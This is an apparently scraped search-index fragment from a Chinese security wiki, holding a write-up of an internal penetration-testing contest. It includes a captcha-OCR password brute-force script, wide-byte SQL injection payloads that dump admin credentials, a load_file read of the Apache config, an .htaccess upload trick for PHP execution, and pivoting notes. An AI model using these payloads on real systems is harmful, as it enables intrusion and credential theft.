\u7528\u6237\u7684\u5e94\u7528\u662f\u4f20\u4e00\u4e2a\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u653b\u51fb\u5e38\u89c1\u7684\u5173\u952e\u5b57 \u2022 \u7528\u6237\u7684\u5e94\u7528\u662f\u4ee3\u7801\u4ea4\u6d41\u7f51\u7ad9\uff0c\u4f20\u4e00\u6bb5\u4ee3\u7801 \u2022 \u719f\u6089\u653b\u51fb\u4ea7\u751f\u4f4d\u7f6e \u2022 \u719f\u6089\u653b\u51fb\u5e38\u89c1\u8bed\u53e5 \u2022 \u638c\u63e1\u653b\u51fb\u5206\u6790\u65b9\u6cd5 \u2022 \u5e38\u89c1\u8bef\u62a5\u539f\u56e0\u53ca\u6539\u8fdb\u63aa\u65bd","title":"5\u3001\u653b\u51fb\u65e5\u5fd7\u5206\u6790\u6d41\u7a0b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/","text":"\u56e2\u961f\u5185\u90e8\u6e17\u900f\u6253\u6bd4\u8d5b\uff08\u8003\u6838\uff09 (\u4e2a\u4eba\u8d5b) \u7b2c\u4e00\u8282\uff1a \u00b6 title:\u8fdb\u5165192.168.1.6 \u83b7\u53d6\u79d8\u5319\u3002 ps: http://www.liuyan.com \u8ddf 192.168.1.6\u662f\u5de5\u4f5c\u533a \u89c4\u7a0b\uff1a\u6e17\u900f\u8fc7\u7a0b\u4e0d\u5f97\u4f7f\u7528nmap\u7b49\u626b\u63cf\u7aef\u53e3\u5de5\u5177\uff0c\u66f4\u52a0\u4e0d\u80fd \u4f7f\u7528WEB\u626b\u63cf\u5668\u3002\uff08\u53ea\u8981\u6709\u5173\u4e8e\u722c\u866b\u90fd\u4e0d\u884c or \u626b\u63cfowasp top 10 \uff09\u9664\u975e\u5de5\u5177\u662f\u4f60\u4e2a\u4eba\u5199\u7684\u3002 \u66f4\u52a0\u4e0d\u53ef\u4ee5\u4f5c\u5f0a\uff1a\u6bd4\u5982 ip\u51b2\u7a81\uff0c\u4e2d\u95f4\u4eba\u653b\u51fb\u3002\u8bf7\u4fdd\u6301\u597d\u4e2a\u4eba\u7d20\u8d28\u3002\u7279\u522b\u6ce8\u610f\uff1a\u5168\u8fc7 \u7a0b\u4e2d\u4e0d\u5f97\u6c42\u52a9\u589e\u63f4\uff0c\u53ea\u80fd\u9760\u4e2a\u4eba\u5b9e\u529b\uff0c\u4e3a\u4e86\u9632\u6b62\u4f5c\u5f0a\u5168\u8fc7\u7a0b \u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002 \u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u6253\u5f00 http://192.168.1.6 \u63d0\u793a\u6ca1\u6743\u9650\u8bbf\u95ee\u3002\u3002\u3002 \u4f30\u8ba1\u505a\u4e86\u767d\u540d\u5355\u9a8c\u8bc1\u3002\u3002\u3002 \u7136\u800c\uff1a http://www.liuyan.com \u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002 \u7b80\u5355\u6536\u96c6\u4e0b\u4fe1\u606f\uff1a http://www.liuyan.com [200] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.1.7], Index\u00adOf, Title[Index of /] \u63d0\u793a\u8bf4\uff1a\u5bc6\u7801 4\u4f4dint\u5bc6\u7801\u3002 \u6211\u4e00\u5f00\u59cb\u60f3\u5230\u4e86\u5bc6\u7801\u7206\u7834 \u81f3\u4e8e\u9a8c\u8bc1\u7801\u561b \u80af\u5b9a\u662f\u5b58\u5728session \u6ca1\u66f4\u65b0\u5bfc\u81f4\u9a8c\u8bc1\u7801\u590d\u7528\u7684\u6f0f\u6d1e\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e \u4e0d\u5b58\u5728\u3002 \u6240\u4ee5\u552f\u4e00\u7684\u529e\u6cd5\u5c31\u662f\u5199\u9a8c\u8bc1\u7801\u8bc6\u522b\u3002\u3002 \u5206\u6790\u4e00\u4e0b\u9a8c\u8bc1\u7801\u7684 \u951a\u70b9 \u8ddf \u5e72\u6270\u7ebf\uff0c\u4ee5\u53ca\u6a21\u7cca\u5ea6 \u7b49\u3002 \u7ecf\u8fc7\u5206\u6790\u5982\u679c\u8981\u8ba9\u7a0b\u5e8f\u8bc6\u522b\u8fd9\u79cd\u9a8c\u8bc1\u7801\u7b49\u8bdd\u6210\u529f\u7387\u5927\u6982\u6709 90\uff05\u3002 coding=utf\u00ad8 import requests,pytesseract,os,time,re\u037e from PIL import Image cookie = {'PHPSESSID': 'e5n02iaupp5kbctejsn4i536m9'} for intt in xrange(1000,9999): r =requests.get('http://www.liuyan.com/3.php',cookies =cookie) l = open('./3.png', 'w+') l.write(r.content)\u037e l.flush()\u037e os.fsync(l)\u037e l.close()\u037e if os.path.isfile('3.png') : Image.open('3.png') image = Image.open('3.png') vcode = pytesseract.image_to_string(image) canshu = {'act': 'post', 'password': intt ,'Verification':vcode} r =requests.post('http://www.liuyan.com/1.php',data= canshu,cookies=cookie) html = r.text.encode('utf\u00ad8')\u037e r = r\"No,passworld\"\u037e if re.findall(r,html) : print 'NO ,passwd: %i' % (intt)\u037e else: print 'YES ,passwd: %i' % (intt)\u037e break time.sleep(0.05)\u037e \u5bc6\u7801 1115 \u7136\u540e\u8fdb\u5165\u5230\u8fd9\u4e2a\u9875\u9762\uff1a \u4e00\u76f4\u60f3\u4e0d\u660e\u767d\u8fd9\u662f\u5e72\u561b\u7684\u3002\u5355\u5f15\u53f7\u4e5f\u6ca1\u62a5\u9519\u3002\u7136\u540e\u7ecf\u7528\u6389 js\u3002\u3002 \u7136\u540e\u770b\u5230\u4e86\u8fd9\u4e2a\uff1a \u5e94\u8be5\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\u4e4b\u540e\u5c31\u8df3\u8f6c\u4e86 \u5bfc\u81f4\u770b\u4e0d\u5230\u8fd9\u4e2a\u4fe1\u606f\uff0c\u518d \u60f3\u4ed6\u7ed9\u6211\u63d0\u793a\u8fd9\u4e2a\u5e72\u5565\uff1f\u96be\u5230sql\u6ce8\u5165\uff1f \u770b\u5230\u4e86\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u53ea\u80fd\u628a\u6ce8\u610f\u529b\u653e\u5230\u540e\u53f0\u90a3\u8fb9\uff1a \u7206\u7834\u4e86\u597d\u4e45\u90fd\u6ca1\u7ed3\u679c\u3002\u3002\u6d6a\u8d39\u4e86\u4e00\u5806\u65f6\u95f4\uff0c\u6536\u96c6\u4e86\u51fa\u9898\u5b98\u7684 \u624b\u673a\u5565\u7684\u7206\u7834\u90fd\u6ca1\u7ed3\u679c\u3002\u3002 \u867d\u7136\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u4e86\u3002\u4f46\u6211\u7a81\u7136\u53c8\u60f3\u5230\u4e86\u5bbd\u5b57\u8282\u6ce8\u5165\u3002\u3002\u3002 \u679c\u7136\u3002\u3002\u3002\u3002\u3002\u5f97\u5230\u6570\u636e\u5e93\uff1ahacker \u6d4f\u89c8\u5668\u597d\u9ebb\u70e6\u3002\u3002\u60f3\u7528burp\u4f46\u662f\u53c8\u4e0d\u80fd\u7528\u3002\u3002 \u672c\u6765\u60f3\u7206\u6570\u636e\u5e93\u5bc6\u7801\u7684 \u4f46\u662fmysql\u6ca1\u6709\u5f00\u542f\u5916\u94fe \u4e5f\u8003\u8651\u5230\u6570\u636e\u5e93\u5bc6\u7801\u53ef\u80fd\u8fd8\u89e3\u4e0d\u5f00\u3002 \u5148\u8fdb\u540e\u53f0\u770b\u770b\u5427\u3002 \u66b4\u8868\uff1a select table_name from information_schema.tables where table_schema=database() insert into liuyan values ('\u904b' , (select table_name from information_schema.tables where table_schema=database() limit 0,1))##' , 'e') \u66b4\u5b57\u6bb5\uff1a insert into liuyan values ('\u904b' , (selEct GrouP_coNCat(COLUMN_NAME) fRom information_schEma.COLUMNS where TABLE_NAME=0x61646d696e limit 0,1))##' , 'e') \u6570\u636e\u5e93 hacker \u8868:liuyan , admin admin\u5b57\u6bb5\uff1auser,pass \u66b4\u6570\u636e\uff1a selEct GrouP_coNCat(user,0x2D002D00,pass) fRom admin as ww limit 0,1 insert into liuyan values ('\u904b' , (selEct GrouP_coNCat(user,0x2D002D00,pass) fRom admin limit 0,1))##' , 'e') \u5176\u5b9e\u6211\u5f88\u60f3\u7528sqlmap\u8fdb\u884c\u6ce8\u5165 \u56e0\u4e3a\u4e0a\u9762\u7684\u89c4\u5219\u6ca1\u6709\u8bf4\u4e0d\u80fd \u7528sqlmap \u4f46\u662fsqlmap\u597d\u50cf\u4e0d\u652f\u6301values\u6ce8\u5165\uff0c\u6ce8\u5165\u7684\u65f6 \u5019\u5c45\u7136\u68c0\u6d4b\u4e0d\u51fa\u6765\u3002 \u7136\u540e\u6211\u95ee\u4e86\u4e00\u4e2a\u5927\u795e\u3002 \u7136\u540e\u767b\u5f55\u540e\u53f0\uff1a \u5bc6\u7801\u9519\u8bef\uff1f\uff1f\u8fd9\u91cc\u6211\u62bd\u6839\u70df\u82b1\u4e8610\u5206\u949f\u5728\u60f3\u539f\u7406\uff08\u56e0\u4e3a\u6211\u6574 \u4e2a\u6570\u636e\u5e93\u90fd\u7ffb\u904d\u4e86\uff09 \u7136\u540e\u67e5\u770b\u6e90\u7801\u3002\u3002\u3002 \u8fd8\u597d \u6211\u61c2js\u3002\u3002\u3002\u4e0d\u7136\u5c31\u6c38\u8fdc\u5361\u5728\u8fd9\u4e86\u3002\u3002 \u4e00\u4e2a\u70b9\u51fb\u4e8b\u4ef6\u89e6\u53d1\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f60\u7684cookie\u540d\u79f0tem\u7684\u503c\u4e0d \u7b49\u4e8ehacker\u7684\u8bdd \u90a3\u4e48\u5c31\u8f93\u51fa\u4e00\u53e5\u8bdd \u7136\u540efalse \u4e0d\u518d\u6267\u884c\u3002 \u7136\u540e\u6211\u7981\u7528\u6389\u4e86js \u8fdb\u884c\u767b\u5f55\u53d1\u73b0\u8fd8\u662f\u767b\u5f55\u4e0d\u4e86\u3002\u3002\u96be\u4e0d\u6210\u4e5f \u5728\u540e\u53f0\u505a\u9650\u5236\u4e86\uff1f\u597d\u5427\u3002\u8fd8\u662f\u8001\u8001\u5b9e\u5b9e\u7684\u5b9a\u4e49cookie \u5427\u3002 \u767b\u5f55\u4e4b\u540e\u662f\u4e2a\u4e0a\u4f20\u3002\u4e0d\u8fc7\u9700\u8981\u63d0\u4f9b\u4e0a\u4f20\u8def\u5f84\u3002 \u83b7\u53d6\u4e0a\u4f20\u8def\u5f84\u67092\u79cd\u65b9\u6cd5\u3002 \u7b2c\u4e00\u79cd \u56e0\u4e3a\u5b58\u5728sql\u6ce8\u5165 \u6240\u4ee5\u628a\u90a3\u4e2a\u7559\u8a00\u7684\u6570\u636e\u5168\u90e8\u5220\u6389\uff0c \u770b\u770b\u62a5\u4e0d\u62a5\u9519\uff0c\u56e0\u4e3a\u6211\u53d1\u73b0\u597d\u591a\u7a0b\u5e8f\u5458\u5728\u524d\u7aef\u8f93\u51fa\u6570\u636e\u7684\u65f6 \u5019\u6839\u672c\u4e0d\u5224\u65ad\u6570\u636e\u662f\u5426\u4e3a\u7a7a\u5c31\u76f4\u63a5\u904d\u5386\u4e86\u3002 \u7b2c\u4e8c\u79cd \u56e0\u4e3a\u5b58\u5728sql\u6ce8\u5165 \u6240\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u914d\u7f6e\u6587\u4ef6\u67e5\u770b\u8def\u5f84 \u5f53\u7136\u5982\u679c\u9ed8\u8ba4\u8def\u5f84\u6ca1\u6539\u7684\u8bdd\u3002 ubuntu apache \u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84 /etc/apache2/apache2.conf selEct load_file(0x2f6574632f617061636865322f6170616 36865322e636f6e6620) \u7ecf\u8fc7\u6d4b\u8bd5 \u662f\u9ed1\u540d\u5355\u9a8c\u8bc1 \u7136\u540e\u5229\u7528 .htaccess \u4e0a\u4f20 \u65b0\u5efa\u4e2a .htaccess\u6587\u4ef6\u5185\u5bb9: ForceType application/x\u00adhttpd\u00adphp SetHandler application/x\u00adhttpd\u00adphp \u5728\u4ed6\u5f53\u524d\u76ee\u5f55\u4e0b \u53ea\u8981\u662f\u4ee5jpg\u7ed3\u5c3e\u7684 \u90fd\u4f1a\u4ee5PHP\u7a0b\u5e8f\u53bb\u89e3\u6790 mac os x \u6e17\u900f\u597d\u9ebb\u70e6\uff0c\u56e0\u4e3a\u6ca1\u73af\u5883\u3002\u3002\u3002\u3002\u6316\u6f0f\u6d1e\u8fd8\u53ef \u4ee5\u3002\u3002\u54ce\u3002\u8fd9\u5de5\u5177\u5361\u5728\u8fd9\u4e86\uff0c\u5e73\u65f6\u90fd\u80fd\u7528\u7684\uff0c\u4eca\u5929\u6362\u4e86jpg \u5c31\u5361\u8fd9\u4e86\u3002\u5e0c\u671b\u770b\u5230\u7684\u53cd\u9988bug\u7ed9\u8fd9\u4e2a\u4f5c\u8005\u3002\u3002 \u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u770b\u770b\u3002 \u8fd9\u6743\u9650\u597d\u50cf\u6709\u70b9\u4e0d\u79d1\u5b66\u3002\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u51fa\u9898\u5b98\u6545\u610f\u7684\u3002\u3002\u3002 \u4e0b\u8f7d\u4e2anc \u8fdb\u884c\u8f6c\u53d1 \u5f88\u591a\u4eba\u90fd\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8981\u7528nc\u8f6c\u53d1\uff0c\u96be\u5230\u7528\u83dc\u5200\u6765\u6267\u884c\u547d\u4ee4 \u4e0d\u662f\u65b9\u4fbf\u70b9\u561b\uff1f \u8fd9\u70b9\u6211\u5f97\u8bf4\u4e00\u4e0b\u865a\u62df\u5316\u7684\u6267\u884c\u547d\u4ee4\u7684\u533a\u522b\u3002\u5c31\u6bd4\u5982\uff1a \u770b\u5230\u533a\u522b\u5728\u54ea\u4e86\u5427\uff1f \u524d\u9762\u6211\u63a8\u65ad192.168.1.6 \u5e94\u8be5\u505a\u4e86\u767d\u540d\u5355 \u6240\u4ee5\u6211\u7684\u601d\u8def\u662f \u60f3\u901a\u8fc7\u8fd9\u4e2a\u8089\u9e21\u6765\u4ee3\u7406\u8fdb\u884c\u8bbf\u95ee\u7136\u540e\u518d\u6e17\u900f\u3002 \u7136\u540e\u8089\u9e21\u4e0a\u7684Socks \u5df2\u7ecf\u5b89\u88c5\u6210\u529f \u4f46\u662f\u6211\u81ea\u5df1\u7684mac os x\u5374\u5b89\u88c5\u5931\u8d25 \u4e0akali\u5427 kali\u5c31\u662fubuntu.... \u54c8\u54c8 \u5f00\u5fc3\u6b7b\u4e86\u3002\u5c45\u7136\u8ddf\u6211\u60f3\u7684\u4e00\u6837\u3002\u3002 http://192.168.1.6/admin.php \u5e94\u8be5\u662f\u540e\u53f0\u767b\u5f55\u3002 http://192.168.1.6/register.php \u8fd9\u662f\u6ce8\u518c\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u82b1\u4e86\u6574\u6574\u5dee\u4e0d\u591a30\u5206\u949f\u624d\u641e\u5b9a\u3002 \u4f60\u60f3\u554a\u3002\u4ed6\u5c31\u7ed9\u4f60\u4e00\u4e2a\u767b\u5f55\u4e00\u4e2a\u6ce8\u518c\uff0c\u7136\u540e\u63d0\u793a\u7ba1\u7406\u5458\u7684\u8d26 \u53f7\u662fadmin\u3002 \u7136\u540e\u6211\u53c8\u60f3\u5230\u4e86\u6211\u4ee5\u524d\u770b\u8fc7\u4e00\u672c\u4e66 \u5c31\u662f\u767d\u5e3d\u5b50\u8bb2\u89e3web\u5b89 \u5168\u3002\u3002 \u8fd9\u4e2a\u662fmy.ini\u7684\u6f0f\u6d1e\u3002 sql\ufffemode=\"NO_AUTO_CREATE_USER,NO_ENGINE_SU BSTITUTION\" \u6211\u8fd8\u662f\u8bf4\u4e00\u4e0b\u539f\u7406\u5427\u3002\u3002\u3002\u3002 \u6bd4\u5982\u4e00\u4e2a\u8868\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684\uff1a create table admin( username varchar(10) not null, passwd varchar(10) not null)\u037e \u53ef\u4ee5\u770b\u5230username\u8ddfpasswd\u7684\u5b57\u8282\u4e3a10 \u4f46\u662f\u8fd9my.ini \u8bbe\u7f6e\u6210 sql\ufffemode=\"NO_AUTO_CREATE_USER,NO_ENGINE_SU BSTITUTION\"\u7684\u8bdd \u5c31\u7b97\u8d85\u51fa\u4e5f\u4f1a\u6dfb\u52a0\u6210\u529f \u6bd4\u5982\uff1a insert into admin values(\u20181234567891 2\u2019,and)\u037e \u4ed6\u4e0d\u4f1a\u63d2\u5165\u201c1234567891 2 \u201d\u800c\u662f\u63d2 \u201d1234567891\u201c \u56e0\u4e3a\u6307\u9488\u52301\u7684\u65f6\u5019\u5b57\u8282\u5c31\u7b49\u4e8e10 \u4e86\u3002\u3002\u3002 \u6700\u540e\u5f97\u5230\u5bc6\u94a5\uff1aadkbdf!@#dmejfn^&*! \u9664\u4e86\u7b2c\u4e00\u8282\u53ef\u4ee5\u5b8c\u6210 \u5176\u5b83\u90fd\u662f\u5b8c\u6210\u4e0d\u4e86\u7684\u3002 (\u4e2a\u4eba\u8d5b) \u7b2c\u4e8c\u8282\uff1a \u00b6 title:app\u53cd\u7f16\u8bd1\u67e5\u627e\u6f0f\u6d1e \u89c4\u5219\uff1a\u4e0d\u5f97\u6c42\u52a9\u522b\u4eba\uff0c\u5168\u8fc7\u7a0b\u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002 \u7b2c\u4e09\u8282\uff1a \u00b6 title:\u4fee\u6539Sqlmap\u6e90\u7801 ps: http://www.demo.com/1.php?id=1 \u5b58\u5728SQL\u6ce8\u5165 \u4e0d\u8fc7select from \u5355\u5f15\u53f7 union \u90fd\u88ab \u8fc7\u6ee4\u4e86\uff0c\u800c\u4f60\u4eec\u8981\u505a\u7684\u5c31\u662f\u901a\u8fc7SQLMAP\u8fdb\u884c\u6ce8\u5165\u3002 \u89c4\u5219\uff1a\u4e0d\u5f97\u6c42\u52a9\u522b\u4eba\uff0c\u5168\u8fc7\u7a0b\u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002 \uff08\u56e2\u961f\u8d5b\uff09 \u7b2c\u56db\u8282\uff1a \u00b6 title\uff1a\u53cd\u9ed1\u5ba2\uff0c\u6293\u9ed1\u5ba2\u3002 ps:\u67d0\u516c\u53f8\u51cc\u66683\u70b946\u5206\u7cdf\u5230\u4e0d\u660e\u9ed1\u5ba2\u5165\u4fb5\uff0c\u6570\u636e\u6cc4\u9732\u3002\u800c \u4f60\u4eec\u8981\u505a\u7684\u5c31\u662f \u5b9a\u4f4d\u4ed6\uff0c\u627e\u5230\u4ed6\uff0c\u902e\u6355\u4ed6\u3002 \u89c4\u5219\uff1a\u6ca1\u4efb\u4f55\u89c4\u5219\u3002 \u56e0\u4e3a2\uff5e4\u90fd\u5931\u8d25\u4e86\uff0c\u6240\u4ee5\u5c31\u6ca1\u5199\u4e86\u3002 \u7b2c\u4e8c\u8282\u5931\u8d25\u539f\u56e0\uff1a\u5229\u7528dex2jar jdgui\u8fdb\u884c\u53cd\u7f16\u8bd1\u5f97\u5230\u6e90 \u7801\uff0c\u7136\u540e\u3002\u3002\u3002\u770b\u4e0d\u61c2java\u8bed\u8a00 \u53c8\u627e\u4e0d\u5230\u4e00\u4e9b\u654f\u611f\u7684\u6587\u4ef6 \u6240\u4ee5\u5931\u8d25\u3002 \u7b2c\u4e09\u8282\u5931\u8d25\u539f\u56e0\uff1a\u4fee\u6539\u4e86sqlmap\u6e90\u7801\u5c31\u5b58\u5728\u5404\u79cdbug\u3002\u800c \u4e14\u6709\u90e8\u5206\u6e90\u7801\u8fd8\u770b\u4e0d\u61c2\uff0c\u56e0\u4e3a\u592a\u591a\u6a21\u5757\u90fd\u6ca1\u7528\u8fc7\u3002\u6240\u4ee5\u9009\u62e9 \u653e\u5f03\u3002 \u7b2c\u56db\u8282\u5931\u8d25\u539f\u56e0\uff1a\u9ed1\u5ba2\u5165\u4fb5\u4e86\u670d\u52a1\u5668\u7136\u540e\u4fee\u6539apache\u65e5\u5fd7 \u6e05\u7a7a\uff0c\u7136\u540e\u518d\u5220\u9664\uff0c\u7136\u540e\u53c8\u5199\u4e2a\u811a\u672c\u5f00\u673a\u542f\u52a8\uff0c\u5f00\u673a\u540e\u5c31\u4f1a \u8fd0\u884c\u7a0b\u5e8f\u5220\u9664\u670d\u52a1\u5668\u65e5\u5fd7\u7b49\uff0c\u6211\u4eec\u8fd8\u539f\u4e86iis\u65e5\u5fd7\u540e \u6587\u4ef6\u662f \u7a7a\u7684\u3002\u6298\u817e\u4e86\u51e0\u5c0f\u65f6\u4e4b\u540e\u9009\u62e9\u653e\u5f03\u3002\uff08\u4e0d\u8fc7\u67091\u4e2a\u6210\u5458\u6210\u529f \u83b7\u53d6\u5230\u4e86\u5165\u4fb5\u8005ip \u6d41\u7a0b\u597d\u50cf\u662f\u5165\u4fb5\u4e86vpn\u670d\u52a1\u5668\u4e4b\u540e\u6536\u96c6\u9ed1 \u5ba2\u7684\u811a\u5370\uff0c\u83b7\u53d6\u4e86\u9ed1\u5ba2\u7684qq \u6700\u540e\u6210\u529f\u83b7\u53d6\u5230\u9ed1\u5ba2ip \u624b\u673a\u53f7 \u7801 \u5e38\u7528\u5bc6\u7801 \u5728\u54ea\u5de5\u4f5c\u3002\u6211\u5f88\u597d\u5947\u7684\u95ee\u4ed6 \u4f60\u662f\u600e\u4e48\u8fd8\u539f\u6587\u4ef6 \u5185\u5bb9\u7684\u3002\u4ed6\u8ddf\u6211\u8bf4\u4e86\u4e00\u5927\u5806\u3002\u6211\u4e00\u70b9\u90fd\u542c\u4e0d\u61c2\u3002\u3002\u3002\u3002\uff09","title":"\u5185\u90e8\u6e17\u900f\u6bd4\u8d5b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/#_1","text":"title:\u8fdb\u5165192.168.1.6 \u83b7\u53d6\u79d8\u5319\u3002 ps: http://www.liuyan.com \u8ddf 192.168.1.6\u662f\u5de5\u4f5c\u533a \u89c4\u7a0b\uff1a\u6e17\u900f\u8fc7\u7a0b\u4e0d\u5f97\u4f7f\u7528nmap\u7b49\u626b\u63cf\u7aef\u53e3\u5de5\u5177\uff0c\u66f4\u52a0\u4e0d\u80fd \u4f7f\u7528WEB\u626b\u63cf\u5668\u3002\uff08\u53ea\u8981\u6709\u5173\u4e8e\u722c\u866b\u90fd\u4e0d\u884c or \u626b\u63cfowasp top 10 \uff09\u9664\u975e\u5de5\u5177\u662f\u4f60\u4e2a\u4eba\u5199\u7684\u3002 \u66f4\u52a0\u4e0d\u53ef\u4ee5\u4f5c\u5f0a\uff1a\u6bd4\u5982 ip\u51b2\u7a81\uff0c\u4e2d\u95f4\u4eba\u653b\u51fb\u3002\u8bf7\u4fdd\u6301\u597d\u4e2a\u4eba\u7d20\u8d28\u3002\u7279\u522b\u6ce8\u610f\uff1a\u5168\u8fc7 \u7a0b\u4e2d\u4e0d\u5f97\u6c42\u52a9\u589e\u63f4\uff0c\u53ea\u80fd\u9760\u4e2a\u4eba\u5b9e\u529b\uff0c\u4e3a\u4e86\u9632\u6b62\u4f5c\u5f0a\u5168\u8fc7\u7a0b \u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002 \u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u00ad\u6253\u5f00 http://192.168.1.6 \u63d0\u793a\u6ca1\u6743\u9650\u8bbf\u95ee\u3002\u3002\u3002 \u4f30\u8ba1\u505a\u4e86\u767d\u540d\u5355\u9a8c\u8bc1\u3002\u3002\u3002 \u7136\u800c\uff1a http://www.liuyan.com \u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002 \u7b80\u5355\u6536\u96c6\u4e0b\u4fe1\u606f\uff1a http://www.liuyan.com [200] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.1.7], Index\u00adOf, Title[Index of /] \u63d0\u793a\u8bf4\uff1a\u5bc6\u7801 4\u4f4dint\u5bc6\u7801\u3002 \u6211\u4e00\u5f00\u59cb\u60f3\u5230\u4e86\u5bc6\u7801\u7206\u7834 \u81f3\u4e8e\u9a8c\u8bc1\u7801\u561b \u80af\u5b9a\u662f\u5b58\u5728session \u6ca1\u66f4\u65b0\u5bfc\u81f4\u9a8c\u8bc1\u7801\u590d\u7528\u7684\u6f0f\u6d1e\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e \u4e0d\u5b58\u5728\u3002 \u6240\u4ee5\u552f\u4e00\u7684\u529e\u6cd5\u5c31\u662f\u5199\u9a8c\u8bc1\u7801\u8bc6\u522b\u3002\u3002 \u5206\u6790\u4e00\u4e0b\u9a8c\u8bc1\u7801\u7684 \u951a\u70b9 \u8ddf \u5e72\u6270\u7ebf\uff0c\u4ee5\u53ca\u6a21\u7cca\u5ea6 \u7b49\u3002 \u7ecf\u8fc7\u5206\u6790\u5982\u679c\u8981\u8ba9\u7a0b\u5e8f\u8bc6\u522b\u8fd9\u79cd\u9a8c\u8bc1\u7801\u7b49\u8bdd\u6210\u529f\u7387\u5927\u6982\u6709 90\uff05\u3002 coding=utf\u00ad8 import requests,pytesseract,os,time,re\u037e from PIL import Image cookie = {'PHPSESSID': 'e5n02iaupp5kbctejsn4i536m9'} for intt in xrange(1000,9999): r =requests.get('http://www.liuyan.com/3.php',cookies =cookie) l = open('./3.png', 'w+') l.write(r.content)\u037e l.flush()\u037e os.fsync(l)\u037e l.close()\u037e if os.path.isfile('3.png') : Image.open('3.png') image = Image.open('3.png') vcode = pytesseract.image_to_string(image) canshu = {'act': 'post', 'password': intt ,'Verification':vcode} r =requests.post('http://www.liuyan.com/1.php',data= canshu,cookies=cookie) html = r.text.encode('utf\u00ad8')\u037e r = r\"No,passworld\"\u037e if re.findall(r,html) : print 'NO ,passwd: %i' % (intt)\u037e else: print 'YES ,passwd: %i' % (intt)\u037e break time.sleep(0.05)\u037e \u5bc6\u7801 1115 \u7136\u540e\u8fdb\u5165\u5230\u8fd9\u4e2a\u9875\u9762\uff1a \u4e00\u76f4\u60f3\u4e0d\u660e\u767d\u8fd9\u662f\u5e72\u561b\u7684\u3002\u5355\u5f15\u53f7\u4e5f\u6ca1\u62a5\u9519\u3002\u7136\u540e\u7ecf\u7528\u6389 js\u3002\u3002 \u7136\u540e\u770b\u5230\u4e86\u8fd9\u4e2a\uff1a \u5e94\u8be5\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\u4e4b\u540e\u5c31\u8df3\u8f6c\u4e86 \u5bfc\u81f4\u770b\u4e0d\u5230\u8fd9\u4e2a\u4fe1\u606f\uff0c\u518d \u60f3\u4ed6\u7ed9\u6211\u63d0\u793a\u8fd9\u4e2a\u5e72\u5565\uff1f\u96be\u5230sql\u6ce8\u5165\uff1f \u770b\u5230\u4e86\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u53ea\u80fd\u628a\u6ce8\u610f\u529b\u653e\u5230\u540e\u53f0\u90a3\u8fb9\uff1a \u7206\u7834\u4e86\u597d\u4e45\u90fd\u6ca1\u7ed3\u679c\u3002\u3002\u6d6a\u8d39\u4e86\u4e00\u5806\u65f6\u95f4\uff0c\u6536\u96c6\u4e86\u51fa\u9898\u5b98\u7684 \u624b\u673a\u5565\u7684\u7206\u7834\u90fd\u6ca1\u7ed3\u679c\u3002\u3002 \u867d\u7136\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u4e86\u3002\u4f46\u6211\u7a81\u7136\u53c8\u60f3\u5230\u4e86\u5bbd\u5b57\u8282\u6ce8\u5165\u3002\u3002\u3002 \u679c\u7136\u3002\u3002\u3002\u3002\u3002\u5f97\u5230\u6570\u636e\u5e93\uff1ahacker \u6d4f\u89c8\u5668\u597d\u9ebb\u70e6\u3002\u3002\u60f3\u7528burp\u4f46\u662f\u53c8\u4e0d\u80fd\u7528\u3002\u3002 \u672c\u6765\u60f3\u7206\u6570\u636e\u5e93\u5bc6\u7801\u7684 \u4f46\u662fmysql\u6ca1\u6709\u5f00\u542f\u5916\u94fe \u4e5f\u8003\u8651\u5230\u6570\u636e\u5e93\u5bc6\u7801\u53ef\u80fd\u8fd8\u89e3\u4e0d\u5f00\u3002 \u5148\u8fdb\u540e\u53f0\u770b\u770b\u5427\u3002 